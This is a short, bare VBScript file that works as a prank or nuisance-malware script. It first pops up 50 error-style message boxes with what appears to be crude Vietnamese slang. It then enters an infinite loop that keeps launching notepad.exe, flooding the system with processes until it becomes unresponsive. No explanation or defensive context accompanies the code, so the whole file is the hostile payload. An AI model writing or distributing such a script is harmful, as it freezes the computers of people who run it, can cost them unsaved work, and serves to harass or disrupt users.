Set shell = CreateObject("WScript.Shell")
For i = 1 To 50
    MsgBox "Binh Bu Cu!", 16, "Binh Bu Lon!"
Next
Do
    shell.Run "notepad.exe"
Loop
